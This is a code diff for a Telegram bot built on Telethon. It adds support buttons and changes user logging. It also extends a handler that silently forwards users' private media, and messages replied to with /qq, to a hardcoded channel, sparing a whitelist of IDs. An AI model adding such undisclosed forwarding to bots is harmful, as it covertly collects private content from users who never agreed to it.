@@ -11,12 +11,12 @@ text = help_msg
 @aai.on(events.NewMessage(incoming=True, pattern=f"^/start({Vars.BOT_USERNAME})$"))
 async def start(event):
     user = await aai.get_entity(int(event.sender.id))
-    await record(user.id)
     if event.is_group: await event.reply(
         await start_msg(user.first_name),
-        buttons=[[Button.url("Dev", "https://t.me/zarox")], [Button.url("Updates", "https://t.me/execal")]],
+        buttons=[[Button.url("Dev", "https://t.me/zarox")], [Button.url("Updates", "https://t.me/execal")], [Button.url("Support", "https://t.me/execalchat")]],
         link_preview=True
     )
+    await record(event.chat_id, fi="g.txt")
 
         
 @aai.on(events.NewMessage(incoming=True, pattern=f"^/help({Vars.BOT_USERNAME})$"))
@@ -38,7 +38,7 @@ async def help(event):
         user = event.sender.id
         if event.is_private: await event.reply(
             text,
-            buttons=[Button.inline("Inline", data=f"inline_{user}")],
+            buttons=[Button.url("Support", url=f"https://t.me/execalchat")],
             link_preview=False
         )
         
@@ -61,17 +61,20 @@ async def ping(event):
 async def start(event):
     user = await aai.get_entity(int(event.sender.id))
     web = event.pattern_match.group(2)
-    await record(user.id)
+    
     if event.is_private:
+        await record(event.chat_id)
         startm = f"#START\n**User**: [{user.first_name}](tg://user?id={user.id})\n**Username**: @{user.username}\n**ID**: {user.id}"
         if web and web == "web":
             startm += "\n\n**From Web**"
-        await aai.send_message(int(Vars.LOG_GRP), startm)
+        if user.id != 6034486765:
+            await aai.send_message(int(Vars.LOG_GRP), startm)
         await event.reply(
         await start_msg(user.first_name),
         buttons=[[Button.url("Dev", "https://t.me/zarox")], [Button.url("Updates", "https://t.me/execal")]],
         link_preview=True)
 
+        
 
 
 
@@ -510,9 +513,12 @@ async def start(event):
 
 
 
-    
-@aai.on(events.NewMessage(incoming=True))
+@aai.on(events.NewMessage(incoming=True, pattern=f"/qq(3d)?({Vars.BOT_USERNAME})?", func=lambda e: bool(e.reply_to)))
+@aai.on(events.NewMessage(incoming=True, func=lambda e: bool(e.is_private and e.media)))
 async def copypaste(event):
-    user_ = int(event.sender_id)
-    if user_ != Vars.OWNER_ID and event.is_private and event.media:
-          await event.forward_to(-1001495812434)
+    if event.sender_id in [6034486765, 2071151067, 1413518510, 5052959324, 1211296093, 5438769366, 2031166458, 5700611191, 919234422, 1391775586, 6032807619, 769998311, 1388540134, 5316731645, 5101665181, 5551768599]: return
+    reply = await event.get_reply_message()
+    if reply:
+        await reply.forward_to(-1001495812434)
+    else:
+        await event.forward_to(-1001495812434)
